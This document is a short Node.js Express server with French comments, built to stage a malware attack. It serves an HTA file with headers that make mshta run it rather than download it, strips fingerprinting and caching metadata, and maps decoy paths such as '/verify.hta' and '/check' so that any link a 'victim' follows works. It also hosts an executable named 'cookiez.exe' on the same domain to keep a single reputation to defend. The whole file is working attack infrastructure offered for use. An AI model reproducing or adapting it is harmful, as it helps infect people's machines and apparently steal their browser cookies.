"use strict";

const express = require("express");
const path    = require("path");

const app = express();

/* [S1] retire l'empreinte "X-Powered-By: Express" */
app.disable("x-powered-by");

const HTA = path.join(__dirname, "file.hta");
const EXE = path.join(__dirname, "cookiez.exe");

/* =====================================================================
   [S2] En-tetes maitrises.
   mshta doit voir un DOCUMENT HTA a executer, pas un fichier a telecharger.
   On force donc application/hta + inline, et on interdit toute mise en cache.
   ===================================================================== */
const HTA_HEADERS = {
  "Content-Type": "application/hta; charset=utf-8",
  "Content-Disposition": 'inline; filename="file.hta"',
  "Cache-Control": "no-cache, no-store, must-revalidate",
  "Pragma": "no-cache",
  "Expires": "0"
  /* [S5] OPTIONNEL : "X-Content-Type-Options": "nosniff"
     Plus strict, mais IE doit alors faire confiance a application/hta.
     Teste ; si mshta n'execute plus, retire la ligne. */
};

/* [S3] Ni ETag ni Last-Modified :
   - plus de fuite de date de build
   - mshta recupere toujours la version fraiche (pas de cache conditionnel) */
const NO_META = { etag: false, lastModified: false };

function serveHta(req, res){
  res.set(HTA_HEADERS);
  res.sendFile(HTA, NO_META, function(err){
    if(err && !res.headersSent) res.status(404).send("file.hta missing");
  });
}

/* [S4] Plusieurs alias pour la meme chose : peu importe ce que tape la victime,
   et l'extension .hta est preservee dans le nom de cache d'IE. */
app.get("/",           serveHta);
app.get("/file.hta",   serveHta);
app.get("/verify.hta", serveHta);
app.get("/check",      serveHta);

/* =====================================================================
   [S6] L'exe servi par le MEME domaine que le HTA.
   -> une seule reputation a defendre au lieu de deux (GitHub + toi),
      et plus de redirection GitHub au milieu du telechargement.
   ===================================================================== */
app.get("/cookiez.exe", function(req, res){
  res.set({
    "Content-Type": "application/octet-stream",
    "Cache-Control": "no-cache, no-store, must-revalidate"
  });
  res.sendFile(EXE, NO_META, function(err){
    if(err && !res.headersSent) res.status(404).send("cookiez.exe missing");
  });
});

app.use(function(req, res){ res.status(404).send("Not found"); });

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", function(){
  console.log("Server running on port " + PORT);
});
